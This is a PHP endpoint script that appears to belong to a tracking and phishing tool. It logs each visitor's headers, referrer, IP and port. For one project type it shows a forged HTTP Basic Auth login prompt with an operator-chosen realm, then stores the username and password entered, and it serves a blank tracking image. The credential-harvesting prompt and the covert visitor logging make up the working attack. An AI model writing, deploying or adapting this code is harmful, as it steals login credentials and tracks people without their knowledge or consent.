<?php
include('init.php');

$authid = adaddslashes($_REQUEST['authid']);
$proj = chk_api_authid($authid);
$proj_id = $proj['id']; //prject id
$proj_type = $proj['type']; //project type
$proj_type_value = $proj['value']; //project value
$proj_filter = $proj['filter']; //project is prevent multi-log
$proj_logging = $proj['logging'];
$proj_img_type = $proj['img_type'];
$proj_img_height = $proj['height'];
$proj_img_width = $proj['width'];
$proj_img_bg_color = htmlspecialchars_decode($proj['bg_color']);
$force_log = $_REQUEST['force'];
if($force_log != 1 && chklogin($_SESSION['user'])){
	$force = 1;
}else{
	$force = 0;
}
if($proj_img_bg_color == null){$proj_img_bg_color = '#FFF';}
if(!isset($_SESSION['log_track_info_filter'])){
	$_SESSION['log_track_info_filter'] = 0;
}
if($proj != 0 && $proj_logging == 1){

	if($force != 1){
		if($proj_type == 2 && !isset($_SERVER['PHP_AUTH_USER'])){
			header('WWW-Authenticate: Basic realm="'.addslashes($proj_type_value).'"');
			header('HTTP/1.0 401 Unauthorized');
		}
		$argv = htmlspecialchars($_SERVER['argv']);
		$argc = htmlspecialchars($_SERVER['argc']);
		$REQUEST_METHOD = htmlspecialchars($_SERVER['REQUEST_METHOD']);
		$REQUEST_TIME_FLOAT = htmlspecialchars($_SERVER['REQUEST_TIME_FLOAT']);
		$QUERY_STRING = htmlspecialchars($_SERVER['QUERY_STRING']);
		$HTTP_ACCEPT = htmlspecialchars($_SERVER['HTTP_ACCEPT']);
		$HTTP_ACCEPT_CHARSET = htmlspecialchars($_SERVER['HTTP_ACCEPT_CHARSET']);
		$HTTP_ACCEPT_ENCODING = htmlspecialchars($_SERVER['HTTP_ACCEPT_ENCODING']);
		$HTTP_ACCEPT_LANGUAGE = htmlspecialchars($_SERVER['HTTP_ACCEPT_LANGUAGE']);
		$HTTP_CONNECTION = htmlspecialchars($_SERVER['HTTP_CONNECTION']);
		$HTTP_HOST = htmlspecialchars($_SERVER['HTTP_HOST']);
		$HTTP_USER_AGENT = htmlspecialchars($_SERVER['HTTP_USER_AGENT']);
		$REMOTE_HOST = htmlspecialchars($_SERVER['REMOTE_HOST']);
		$REMOTE_PORT = htmlspecialchars($_SERVER['REMOTE_PORT']);
		$username = htmlspecialchars($_SERVER['PHP_AUTH_USER']);
		$password = htmlspecialchars($_SERVER['PHP_AUTH_PW']);
		$content = array (
			'HTTP_USER_AGENT'=> $HTTP_USER_AGENT,
			'Argv' => $argv,
			'Argc' => $argc,
			'REQUEST_METHOD' => $REQUEST_METHOD,
			'REQUEST_TIME_FLOAT'=> $REQUEST_TIME_FLOAT,
			'QUERY_STRING'=> $QUERY_STRING,
			'HTTP_ACCEPT'=> $HTTP_ACCEPT,
			'HTTP_ACCEPT_CHARSET'=> $HTTP_ACCEPT_CHARSET,
			'HTTP_ACCEPT_ENCODING'=> $HTTP_ACCEPT_ENCODING,
			'HTTP_ACCEPT_LANGUAGE'=> $HTTP_ACCEPT_LANGUAGE,
			'HTTP_CONNECTION'=> $HTTP_CONNECTION,
			'HTTP_HOST'=> $HTTP_HOST,
			'REMOTE_HOST'=> $REMOTE_HOST,
			'REMOTE_PORT'=> $REMOTE_PORT,
			'Username'=> $username,
			'Password'=> $password	
		);
		$content = json_encode($content);
		$track_url = htmlspecialchars($_SERVER['HTTP_REFERER']);
		$ip = htmlspecialchars($_SERVER['REMOTE_ADDR']);
		preg_match("/^(http:\/\/)?([^\/]+)/i",$track_url, $matches);
		$domain = $matches[2]; 
		if($domain == NULL){
			$domain = 'nulll';
		}
		$state = insert_trackinfo($proj_id,$content,$track_url,$domain,$ip);
		//echo $state.'----'.$proj_id.'----'.$track_url.'----'.$domain.'----'.$ip.'<br><br>'.$content;
	}
	if($proj_type == 2 && $force != 1){
		echo 'Authorization Required.';
	}else
	if($proj_type == 1 && $force != 1){
		header("Location:$proj_type_value");
	}else{
		$proj_img_bg_color = html2rgb($proj_img_bg_color);
		$im = imagecreate($proj_img_width, $proj_img_height);
		$background = imagecolorallocate($im, $proj_img_bg_color[0], $proj_img_bg_color[1], $proj_img_bg_color[2]);
		imagesetpixel($im,$proj_img_width, $proj_img_height, $background);
		switch($proj_img_type){
			case 1:
				header("Content-type: image/jpeg");
				imagejpeg($im);
				break;
			case 2:
				header("Content-type: image/gif");
				imagegif($im);
				break;
			default:
				header("Content-type: image/png");
				imagepng($im);
		}
		imagedestroy($image);
	}
}
if($proj_filter == 1 && $_SESSION['log_track_info_filter'] != 1){
	$_SESSION['log_track_info_filter'] = 1;
}
exit;
?>
